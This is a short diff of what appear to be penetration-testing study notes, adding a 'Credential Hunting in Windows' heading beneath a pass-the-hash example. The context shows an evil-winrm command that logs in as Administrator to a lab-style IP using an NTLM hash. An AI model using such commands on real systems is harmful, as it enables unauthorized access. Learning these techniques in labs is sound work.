@@ -679,3 +679,5 @@ We can still use hashes to attempt to authenticate with a system using a type of
 ```
 evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
 ```
+
+# Credential Hunting in Windows
